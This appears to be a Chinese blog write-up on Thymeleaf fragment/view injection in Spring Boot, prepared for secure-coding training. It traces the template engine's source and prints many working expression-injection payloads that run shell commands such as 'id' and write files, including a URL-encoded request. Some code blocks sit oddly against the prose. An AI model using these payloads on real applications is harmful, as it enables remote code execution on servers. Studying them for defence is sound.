> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/5h9q3nWgg1LJ6R2lCMYsrA)

本文首发于先知社区，原文地址：https://xz.aliyun.com/t/9826  ，点击阅读原文可达。

全文共 3134 个字，预计阅读时间为 20 分钟。

最近需要给研发部门的开发 GG 们做一场关于 Java 安全编码的培训，一方面后端开发使用 Springboot+thymeleaf 框架较多，因此通过代码示例以及漏洞演示加深理解。借此机会，又再去学习了下安全大佬们关于 Thymeleaf 这个漏洞的研究，因此本文针对漏洞的执行原理和过程并没有新的见解并扩展新的 payload，在复现过程中发现一些新的思路，指出部分文章的一些错误表述，仅此而已。

0x01 环境配置  

无一例外，我也是参考这个 https://github.com/veracode-research/spring-view-manipulation/ 搭建的，核心代码如下：

```
@GetMapping("/path")
public String path(@RequestParam String lang) {
    return "user/" + lang + "/welcome"; //template path is tainted
}
```

```
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x 
```

![](https://mmbiz.qpic.cn/mmbiz_png/mVborIuoDabM1VW7xzYqibwErTxEDIDPktRWyf1zNwj92UyaH9kDFibwic0bVAJbj4oOew7J6E7KNDBhYbicVxtFlg/640?wx_fmt=png)

0x02 Fragment 注入通用 payload
--------------------------

如果这里的控制层用的是 @Controller 进行注解的话，使用如下的 payload 即可触发命令执行。

```
http://ip:port/path?lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22whoami%22).getInputStream()).next()%7d__::.x
```

需要注意的是要进行 urlencode 编码：

```
（1）__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::
（2）__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("touch executed").getInputStream()).next()}__::
```

发送请求后执行 id 命令后回显

![](https://mmbiz.qpic.cn/mmbiz_png/mVborIuoDabM1VW7xzYqibwErTxEDIDPkk2AJBgK6ibic1hAAX0uJMPiamYAwekyx9jN8pWOo6AsAFl9v4wMvISqsQ/640?wx_fmt=png)其实后面的. x 不需要也可以，也就是只有:: 这个也是可以的（不过是不返回执行命令后的结果了，写文件是可以的，以下所有 payload 均不再根据:: 单独列出），有些文章净是瞎说。例如 payload 是这样也是可以的。

```
/**  StandardFragmentProcessor  **/
final FragmentSelection fragmentSelection =
                FragmentSelectionUtils.parseFragmentSelection(configuration, processingContext, standardFragmentSpec);
```

```
final String preprocessedInput =
                StandardExpressionPreprocessor.preprocess(configuration, processingContext, input);
        if (configuration != null) {
            final FragmentSelection cachedFragmentSelection =
                    ExpressionCache.getFragmentSelectionFromCache(configuration, preprocessedInput);
            if (cachedFragmentSelection != null) {
                return cachedFragmentSelection;
            }
        }
final FragmentSelection fragmentSelection =
                FragmentSelectionUtils.internalParseFragmentSelection(preprocessedInput.trim());
```

![](https://mmbiz.qpic.cn/mmbiz_png/mVborIuoDabM1VW7xzYqibwErTxEDIDPkibLGvRuibm004M33j8HqQC3YQ0g3iatkZpFzNlIIS2elhTglXRXVbVVKg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/mVborIuoDabM1VW7xzYqibwErTxEDIDPkkCOI7ibc7VVNViccuHrFnYSZLAXuxv5Wk9kGedK6rOvH1pLPYJianszlQ/640?wx_fmt=png)

0x03 关于为什么这里只能用__${expr}__而不是 ${expr}/${{expr}}
-----------------------------------------------

首先是被误用，导致后续即使代码不是这样写（这个下文会提到），也都沿用这个方式作为解析必要条件。因为当初这个大佬写的代码中 return 的是 "user/" + lang + "/welcome"; 这个代表是 / templates/user 目录下的模板，而__${…}__ 是 thymeleaf 中的预处理表达式，也就是先处理这个再把处理后的结果作为参数带入，因为 templateName 已经有 "user/" 了所以这里必须用__${…}__包装下才能正常被解析，从代码中比较直观看出来：

```
/** StandardExpressionPreprocessor **/
static String preprocess(final Configuration configuration,
            final IProcessingContext processingContext, final String input) {
        if (input.indexOf(PREPROCESS_DELIMITER) == -1) {
            // Fail quick
            return input;
        }
    final IStandardExpressionParser expressionParser = StandardExpressions.getExpressionParser(configuration);
        if (!(expressionParser instanceof StandardExpressionParser)) {
            // Preprocess will be only available for the StandardExpressionParser, because the preprocessor
            // depends on this specific implementation of the parser.
            return input;
        }
//部分省略
    final IStandardExpression expression =
                        StandardExpressionParser.parseExpression(configuration, processingContext, expressionText, false);
                if (expression == null) {
                    return null;
                }
                
                final Object result =
                    expression.execute(configuration, processingContext, StandardExpressionExecutionContext.PREPROCESSING);
//后续省略
```

继续调用 StandardExpressionPreprocessor#_preprocess()；_

 ![](https://mmbiz.qpic.cn/mmbiz_png/mVborIuoDabM1VW7xzYqibwErTxEDIDPkpkNrQZxy7cemVsVLs8MJW91nLNBlb4JibdhicCVbpaMkTf2s53IOxtKQ/640?wx_fmt=png)
----------------------------------------------------------------------------------------------------------------------------------------------

preprocess(预处理）方法首先会检查 input（也就是 templateName) 有没有 "_" 下划线这个字符，没有的话就直接原样返回了, 否则继续往下执行。

```
preprocessedInput="user/${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}::x/welcome"
if use with __${expr}__ syntax  instead 
preprocessedInput2="user/shexxxao::x/welcome"
```

```
/** StandardFragmentProcessor **/ 
// Resolve fragment parameters, if specified (null if not)
        final Map<String,Object> fragmentParameters =
                resolveFragmentParameters(configuration,processingContext,fragmentSelection.getParameters());
        if (fragmentSelection.hasFragmentSelector()) {
            final Object fragmentSelectorObject =
                    fragmentSelection.getFragmentSelector().execute(configuration, processingContext);
            if (fragmentSelectorObject == null) {
                throw new TemplateProcessingException(
                        "Evaluation of fragment selector from spec \"" + standardFragmentSpec + "\" " + 
                        "returned null.");
            }
```

用 ${} 返回 preprocessedInput，用__${}__ 返回 preprocessedInput2（用以区分）

```
666::__${T(java.lang.Runtime).getRuntime().exec("touch 667")}__
//使用时同样需要url编码
```

然后继续运行到 internalParseFragmentSelection()，主要实现去除空格等，重要的一步是检查是否包含 “::" 操作符号，这个符号其实是定位符号，用来查找 template 中的 fragment section 部分。

![](https://mmbiz.qpic.cn/mmbiz_png/mVborIuoDabM1VW7xzYqibwErTxEDIDPk1pRymROTYibPibA6ANsjvbUCQ8iaOm5NkXiadVPLCEUgmdK1dsztW31cNg/640?wx_fmt=png)

其实早在 ThymeleafView#renderFragment() 方法中就先判断了 viewTemplateName 是否包含 "::" 这个操作符号了，否则不会执行上面的 parseFragmentSelection() 过程，压根就不会到后续的 Fragment 表达式解析过程了。

![](https://mmbiz.qpic.cn/mmbiz_png/mVborIuoDaasVgXuX9ic9vzo2A7ybUK8cTibeicI3g1fdQfShYFHuUibh40gLdkbjTcAEcBsY0Dwb543C5ElA8lMWw/640?wx_fmt=png)

也因此为啥称为 Fragment 注入，大都称其为 View 注入。当然只是我觉得用 Fragment 比较符合这个漏洞产生原理，所以叫啥都行，并不重要。

执行到最后会发现 templateNameExpression 为 user/${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()} 这个就无法解析，到这里就抛出异常了。（注意另外一个重要的参数—“fragmentSpecExpression”, 这个后面也有一轮表达式解析的过程，因此:: 后面还可以插入表达式）

![](https://mmbiz.qpic.cn/mmbiz_png/mVborIuoDabM1VW7xzYqibwErTxEDIDPkN8wSfIWkX89F8OEibC7TS717JDpcRhyDuYjnaia55BT4icaBh38mWqElA/640?wx_fmt=png)0x04 新的注入点—“::”

在前面提到 fragmentSpecExpression，这个其实后面对 fragment 的参数进行了解析，核心代码如下：

```
@GetMapping("/path")
public String path(@RequestParam String lang) {
    return lang; //template path is tainted
}
```

```
${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}::x

*{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}::x
```

基于此，可以构造如下 payload:「ps: 由于无法直接回显，所以可以用写文件形式」

```
${{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}}::x

*{{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}}::x
```

可看到文件已经成功写入。

![](https://mmbiz.qpic.cn/mmbiz_png/mVborIuoDabM1VW7xzYqibwErTxEDIDPkPcPtkCRBBtrgEDyfIYoIBPxRiaErSGO7puRWOy6DInYPice21PZB1mfA/640?wx_fmt=png)
---------------------------------------------------------------------------------------------------------------------------------------------

0x11 环境配置 (扩展）
--------------

看到大部分文章是这样配置的：

```
__${new java.util.Scanner(T(String).getClass().forName("java.lang.Runtime")
.getMethod("exec",T(String[])).invoke(T(String).getClass().forName("java.lang.Runtime")
.getMethod("getRuntime")
.invoke(T(String).getClass().forName("java.lang.Runtime")),new String[]{"/bin/bash","-c","id"})
.getInputStream()).next()}__::x
```

同样先正常访问看下响应内容：

![](https://mmbiz.qpic.cn/mmbiz_png/mVborIuoDabM1VW7xzYqibwErTxEDIDPk0oEAsjf6FcAey5Ur7ws1zC22C0lHMia7kYFdPMhnyP7iciauX9wicOaiayA/640?wx_fmt=png)

0x12 Fragment 注入通用 payload1
---------------------------

根据上面分析后，发现其实并不一定需要__${expr}__这种方式来包住 payload , 可以直接用 ${expr} 或者 ${{expr}} 都是可以的。

需要注意的是：除了 ${expr} 以及 ${{expr}} 可以被 Thymeleaf EL 引擎执行外，*{expr} 及 *{{expr}} 也同样可以。

payload1:

```
__${new java.util.Scanner(Class.forName("java.lang.Runtime")
.getMethod("exec",T(String[]))
.invoke(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime")),new String[]{"/bin/bash","-c","id"})
.getInputStream()).next()}__::x
```

```
${new java.util.Scanner(Class.forName("java.lang.Runtime")
.getMethod("exec",T(String[])).invoke(Class.forName("java.lang.Runtime")
.getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime")),new String[]{"/bin/bash","-c","id"}).getInputStream()).next()}::x
```

payload2:

```
*{new java.util.Scanner(Class.forName("java.lang.Runtime")
.getMethod("exec",T(String[])).invoke(Class.forName("java.lang.Runtime")
.getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime")),new String[]{"/bin/bash","-c","id"}).getInputStream()).next()}::x
```

```
${{new java.util.Scanner(Class.forName("java.lang.Runtime")
.getMethod("exec",T(String[])).invoke(Class.forName("java.lang.Runtime")
.getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime")),new String[]{"/bin/bash","-c","id"}).getInputStream()).next()}}::x
```

![](https://mmbiz.qpic.cn/mmbiz_png/mVborIuoDabM1VW7xzYqibwErTxEDIDPk3ia6aiaR9esyeuc9A6ZtHiatEmUem3W35bEqcDibOEyxyvQ4qXgHC5jdmQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/mVborIuoDabM1VW7xzYqibwErTxEDIDPk4riboiaXMvMMdR20h3DQrQYdRickvYTE9fJHPux9tdJP1xzfdia786ibxkw/640?wx_fmt=png)

0x13 Fragment 注入通用 payload2
---------------------------

当然也可以用 Java 反射来改造 payload:

```
*{{new java.util.Scanner(Class.forName("java.lang.Runtime")
.getMethod("exec",T(String[])).invoke(Class.forName("java.lang.Runtime")
.getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime")),new String[]{"/bin/bash","-c","id"}).getInputStream()).next()}}::x
```

或者减少 T(String)，即：

```
__${new java.util.Scanner(Class.forName("java.lang.Runtime")
.getMethod("exec",T(String[]))
.invoke(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime")),new String[]{"/bin/bash","-c","id"})
.getInputStream()).next()}__::x
```

![](https://mmbiz.qpic.cn/mmbiz_png/mVborIuoDabM1VW7xzYqibwErTxEDIDPktW5XDlTo7GZ404TFMrbSngGPibCIiag5B9kTia6DdiafibmcJWePJKKQ1bw/640?wx_fmt=png)

同理用 ${expr} 方式的 payload：

```
${new java.util.Scanner(Class.forName("java.lang.Runtime")
.getMethod("exec",T(String[])).invoke(Class.forName("java.lang.Runtime")
.getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime")),new String[]{"/bin/bash","-c","id"}).getInputStream()).next()}::x
```

及相应的 *{expr} 方式：

```
*{new java.util.Scanner(Class.forName("java.lang.Runtime")
.getMethod("exec",T(String[])).invoke(Class.forName("java.lang.Runtime")
.getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime")),new String[]{"/bin/bash","-c","id"}).getInputStream()).next()}::x
```

用 ${{expr}} 方式的 payload：  

```
${{new java.util.Scanner(Class.forName("java.lang.Runtime")
.getMethod("exec",T(String[])).invoke(Class.forName("java.lang.Runtime")
.getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime")),new String[]{"/bin/bash","-c","id"}).getInputStream()).next()}}::x
```

及相应的 *{{expr}} 方式：

```
*{{new java.util.Scanner(Class.forName("java.lang.Runtime")
.getMethod("exec",T(String[])).invoke(Class.forName("java.lang.Runtime")
.getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime")),new String[]{"/bin/bash","-c","id"}).getInputStream()).next()}}::x
```

![](https://mmbiz.qpic.cn/mmbiz_png/mVborIuoDabM1VW7xzYqibwErTxEDIDPkF2Mf8t4B2re3RX7fpnDagMia9WibQ5bv5OXhicsMfCjxpuULd9lXXeVpg/640?wx_fmt=png)

0xFF 参考文献
---------

[https://mp.weixin.qq.com/s/-KJijVbZGo6W7gLcve9IkQ](https://mp.weixin.qq.com/s?__biz=MzUzNTEyMTE0Mw==&mid=2247484151&idx=1&sn=576d7500462df34a08e1569ce9a595d8&scene=21#wechat_redirect)

https://github.com/veracode-research/spring-view-manipulation/

https://www.thymeleaf.org/doc/tutorials/3.0/thymeleafspring.html

https://www.cnblogs.com/hetianlab/p/13679645.html

也欢迎关注鄙人的公众号～

![](https://mmbiz.qpic.cn/mmbiz_png/mVborIuoDaasVgXuX9ic9vzo2A7ybUK8c96BynfRFZiacMeBVJibHfcqEhicJBX6xNvWqfmfZTsZpg017GBHhrxESA/640?wx_fmt=png)

公众号